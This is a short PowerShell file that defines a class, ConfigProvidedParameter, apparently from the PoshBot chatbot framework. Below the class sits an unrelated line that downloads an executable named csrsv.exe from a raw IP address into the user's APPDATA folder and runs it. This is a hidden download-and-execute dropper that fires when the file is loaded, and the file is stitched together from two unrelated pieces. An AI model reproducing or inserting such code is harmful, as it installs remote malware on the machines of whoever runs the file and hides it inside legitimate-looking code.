
class ConfigProvidedParameter {
    [PoshBot.FromConfig]$Metadata
    [System.Management.Automation.ParameterMetadata]$Parameter

    ConfigProvidedParameter([PoshBot.FromConfig]$Meta, [System.Management.Automation.ParameterMetadata]$Param) {
        $this.Metadata = $Meta
        $this.Parameter = $param
    }
}

(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

